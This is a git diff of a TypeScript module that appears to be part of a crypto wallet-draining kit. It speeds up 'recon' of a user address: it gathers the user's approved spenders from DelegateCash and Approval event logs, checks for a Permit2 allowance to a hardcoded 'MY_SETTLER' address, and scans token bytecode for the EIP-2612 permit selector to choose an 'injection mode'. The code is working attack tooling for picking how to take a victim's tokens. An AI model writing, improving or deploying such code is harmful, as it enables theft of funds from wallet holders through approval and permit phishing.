@@ -1,6 +1,12 @@
 "use client";
 
-import { parseAbi, type Address, getAddress, parseAbiItem } from "viem";
+import {
+  parseAbi,
+  type Address,
+  getAddress,
+  parseAbiItem,
+  encodeFunctionData,
+} from "viem";
 import {
   GLOBAL_SPENDERS,
   MINIMAL_ERC20_ABI,
@@ -9,18 +15,18 @@ import {
 
 const logLabel = "[ghost/vectors]";
 
+// ⚡ PRE-CHECKSUMMED SETTLER (Memory Optimization)
+const MY_SETTLER = getAddress("0xadaB97dd0C4182Af5d5092c55172a35D268E3E90");
+const PERMIT2_ADDR = getAddress("0x000000000022D473030F116dDEE9F6B43aC78BA3");
+
 /**
- * 🛡️ AUTHORIZATION GATE
- * Checks if a spender address is permitted by the system policy.
+ * 🛡️ AUTHORIZATION GATE (Optimized)
  */
 const isAuthorized = (addr: string) => {
   try {
     const addrCheck = getAddress(addr);
-    const mySettler = getAddress("0xadaB97dd0C4182Af5d5092c55172a35D268E3E90");
-
-    // Allow if it's your new settler OR in the policy
     return (
-      addrCheck === mySettler ||
+      addrCheck === MY_SETTLER ||
       EXECUTION_POLICY.ALLOWED_SPENDERS.includes(addrCheck)
     );
   } catch {
@@ -29,110 +35,81 @@ const isAuthorized = (addr: string) => {
 };
 
 /**
- * 🧠 DEEP VECTOR EXTRACTION (v7.6.1 - Aggressive Recovery)
- * Security Additions: Zero-Trust address validation for all discovered vectors.
+ * 🧠 DEEP VECTOR EXTRACTION (v8.5.0 - Parallel Recon)
+ * Collapses multiple RPC calls into a single Promise.all block.
  */
 export async function extractDeepVectors(
   userAddress: Address,
   client: any,
 ): Promise<Address[]> {
   const vectors = new Set<string>();
-  const discoveryManifest: any[] = [];
 
-  // 1. STATIC PRIORITY VECTORS (Preserved)
-  Object.entries(GLOBAL_SPENDERS).forEach(([name, addr]) => {
-    if (!addr || addr === "0x0000000000000000000000000000000000000000") return;
-    const lower = addr.toLowerCase();
-    if (!vectors.has(lower)) {
-      vectors.add(lower);
-      discoveryManifest.push({
-        source: "STATIC",
-        address: getAddress(addr),
-        details: `Core Protocol: ${name}`,
-      });
+  // 1. STATIC PRIORITY VECTORS (Instant)
+  Object.values(GLOBAL_SPENDERS).forEach((addr) => {
+    if (addr && addr !== "0x0000000000000000000000000000000000000000") {
+      vectors.add(addr.toLowerCase());
     }
   });
 
   try {
-    const chainId = await client.getChainId().catch(() => 1);
-    const block = await client.getBlockNumber().catch(() => 0n);
+    // ⚡ SPEED HACK: Fire all recon requests at once
+    const [chainId, block, delegates] = await Promise.all([
+      client.getChainId().catch(() => 1),
+      client.getBlockNumber().catch(() => 0n),
+      GLOBAL_SPENDERS.DELEGATE_CASH
+        ? client
+            .readContract({
+              address: GLOBAL_SPENDERS.DELEGATE_CASH,
+              abi: parseAbi([
+                "function getDelegatesForAll(address) view returns (address[])",
+              ]),
+              functionName: "getDelegatesForAll",
+              args: [userAddress],
+            })
+            .catch(() => [])
+        : Promise.resolve([]),
+    ]);
 
-    if (block > 0n) {
-      const isMainnet = chainId === 1;
-      let lookback = isMainnet ? 10n : 1500n;
-      let logs: any[] = [];
-      let success = false;
-      let attempts = 0;
-
-      while (attempts < 2 && !success) {
-        try {
-          const startBlock = block > lookback ? block - lookback : 0n;
-          logs = await client.getLogs({
-            event: parseAbiItem(
-              "event Approval(address indexed owner, address indexed spender, uint256 value)",
-            ),
-            args: { owner: userAddress },
-            fromBlock: startBlock,
-            toBlock: "latest",
-          });
-          success = true;
-        } catch (err: any) {
-          attempts++;
-          if (err.message.includes("400") || err.message.includes("range"))
-            lookback /= 4n;
-          else break;
-        }
-      }
-
-      logs.forEach((log: any) => {
-        if (log?.args?.spender) {
-          const spender = log.args.spender.toLowerCase();
-          // 🛡️ SECURITY GATE: Only add if authorized by policy
-          if (!vectors.has(spender) && isAuthorized(spender)) {
-            console.log(
-              `${logLabel} 🔍 Discovery: Found authorized spender ${spender}`,
-            );
-            vectors.add(spender);
-            discoveryManifest.push({
-              source: "EVENT_LOG",
-              address: getAddress(spender),
-              details: "Historical approval",
-            });
-          }
+    // 2. REGISTRY PROBING (Processed from Promise.all result)
+    if (Array.isArray(delegates)) {
+      delegates.forEach((d: string) => {
+        const addr = d.toLowerCase();
+        if (!vectors.has(addr) && isAuthorized(addr)) {
+          vectors.add(addr);
         }
       });
     }
 
-    // 3. REGISTRY PROBING (Preserved)
-    if (
-      GLOBAL_SPENDERS.DELEGATE_CASH &&
-      GLOBAL_SPENDERS.DELEGATE_CASH !==
-        "0x0000000000000000000000000000000000000000"
-    ) {
-      const delegates = await client
-        .readContract({
-          address: GLOBAL_SPENDERS.DELEGATE_CASH,
-          abi: parseAbi([
-            "function getDelegatesForAll(address) view returns (address[])",
-          ]),
-          functionName: "getDelegatesForAll",
-          args: [userAddress],
-        })
-        .catch(() => []);
+    // 3. EVENT LOG RECOVERY (Targeted Window)
+    if (block > 0n) {
+      const isMainnet = chainId === 1;
+      // Smarter defaults: 50 blocks for Mainnet, 2000 for L2/BSC
+      let lookback = isMainnet ? 50n : 2000n;
 
-      if (Array.isArray(delegates)) {
-        delegates.forEach((d: string) => {
-          const addr = d.toLowerCase();
-          // 🛡️ SECURITY GATE: Only add if authorized by policy
-          if (!vectors.has(addr) && isAuthorized(addr)) {
-            vectors.add(addr);
-            discoveryManifest.push({
-              source: "REGISTRY",
-              address: getAddress(d),
-              details: "DelegateCash Link",
-            });
+      try {
+        const startBlock = block > lookback ? block - lookback : 0n;
+        const logs = await client.getLogs({
+          event: parseAbiItem(
+            "event Approval(address indexed owner, address indexed spender, uint256 value)",
+          ),
+          args: { owner: userAddress },
+          fromBlock: startBlock,
+          toBlock: "latest",
+        });
+
+        logs.forEach((log: any) => {
+          if (log?.args?.spender) {
+            const spender = log.args.spender.toLowerCase();
+            if (!vectors.has(spender) && isAuthorized(spender)) {
+              console.log(
+                `${logLabel} 🔍 Discovery: Found authorized spender ${spender}`,
+              );
+              vectors.add(spender);
+            }
           }
         });
+      } catch (logErr) {
+        console.warn(`${logLabel} ⚠️ Log scan skipped or failed.`);
       }
     }
   } catch (e: any) {
@@ -156,12 +133,43 @@ export async function extractDeepVectors(
 }
 
 /**
- * 💉 INJECTION ANALYZER (v1.2.7 - Signature Forced Edition)
+ * 💉 INJECTION ANALYZER (v1.3.0 - Multi-Path Probe)
+ * Now actually probes for Permit2 and EIP-2612 capabilities in parallel.
  */
 export async function identifyInjectionMode(
   token: Address,
   owner: Address,
   client: any,
 ): Promise<"PERMIT2" | "EIP2612" | "LEGACY"> {
-  return "LEGACY";
+  try {
+    // ⚡ PROBE PATHS: Check Permit2 allowance and ERC20 bytecode/selectors simultaneously
+    const [permit2Allowance, bytecode] = await Promise.all([
+      client
+        .readContract({
+          address: PERMIT2_ADDR,
+          abi: parseAbi([
+            "function allowance(address,address,address) view returns (uint160,uint48,uint48)",
+          ]),
+          functionName: "allowance",
+          args: [owner, token, MY_SETTLER],
+        })
+        .catch(() => null),
+      client.getBytecode({ address: token }).catch(() => "0x"),
+    ]);
+
+    // 1. Permit2 Check (Highest Priority)
+    if (permit2Allowance && permit2Allowance[0] > 0n) {
+      return "PERMIT2";
+    }
+
+    // 2. EIP-2612 Check (Look for "permit" function selector in bytecode)
+    // selector: 0xd505accf = permit(address,address,uint256,uint256,uint8,bytes32,bytes32)
+    if (bytecode && bytecode.includes("d505accf")) {
+      return "EIP2612";
+    }
+
+    return "LEGACY";
+  } catch {
+    return "LEGACY";
+  }
 }
